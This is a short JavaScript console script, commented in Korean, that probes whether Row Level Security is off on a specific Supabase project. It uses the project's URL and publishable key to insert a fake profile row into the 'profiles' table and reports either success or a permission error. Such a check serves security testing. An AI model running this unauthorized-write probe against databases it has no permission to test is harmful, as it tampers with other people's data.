// 1. 설정 정보 입력
const SUPABASE_URL = "https://lzwfzfvnijediorljtnk.supabase.co";
// 주의: 여기에 'eyJ...'로 시작하는 실제 Supabase Anon Key를 넣으세요.
const SUPABASE_ANON_KEY = "sb_publishable_UGIkoS2D-PseFwUutiwxUw_3BeYS_UH";

// 2. 공격(데이터 삽입) 함수 정의
async function hackDatabase() {
  console.log("🚀 데이터베이스 침투 시도 중...");

  const response = await fetch(`${SUPABASE_URL}/rest/v1/profiles`, {
    method: "POST",
    headers: {
      "apikey": SUPABASE_ANON_KEY,
      "Authorization": `Bearer ${SUPABASE_ANON_KEY}`,
      "Content-Type": "application/json",
      "Prefer": "return=representation", // 삽입된 데이터 반환 요청
    },
    body: JSON.stringify({
      // profiles 테이블 스키마에 맞는 임의 데이터 생성
      id: crypto.randomUUID(),
      email: "hacked_by_console@test.com",
      clerk_user_id: "hacker_" + Date.now(),
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString()
    }),
  });

  if (response.ok) {
    const data = await response.json();
    console.log("✅ 성공! RLS가 꺼져있어 데이터가 삽입되었습니다:", data);
    alert("보안 취약점 확인됨: 데이터가 성공적으로 삽입되었습니다.");
  } else {
    const error = await response.json();
    console.error("❌ 실패:", error);
    if (error.code === '42501') {
      console.log("🛡️ RLS가 작동 중입니다. (권한 없음)");
    }
  }
}

// 3. 실행
hackDatabase();